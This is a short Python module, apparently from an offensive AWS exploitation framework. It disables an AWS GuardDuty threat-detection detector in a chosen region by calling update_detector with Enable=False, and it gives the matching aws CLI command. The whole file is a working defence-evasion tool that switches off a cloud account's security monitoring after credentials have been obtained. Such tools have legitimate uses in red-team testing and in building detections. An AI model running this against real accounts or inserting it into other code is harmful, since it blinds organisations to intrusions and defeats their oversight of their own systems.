import sys

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "guardduty",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"DETECTOR-ID": {
		"value": "",
		"required": "true",
        "description":"The ID of the GuardDuty Detector to Disable"
	}
}
description = "Disables a GD Detector on a specific region. Mind you, many security systems detect this behaviour."

aws_command = "aws guardduty update-detector --detector-id <detector-id>  --no-enable  --region <region> --profile <profile>"

def exploit(profile, workspace):
	detectorID = variables['DETECTOR-ID']['value']

	try:
		profile.update_detector(
			DetectorId=detectorID,
			Enable=False
		)
		status = f"Detector {detectorID} was disabled"
	except:
		status = f"Detector {detectorID} was not disabled with error code: {str(sys.exc_info()[1])}."

	return {
		"Detector": {
			"Detector": detectorID,
			"Status": status
		}
	}

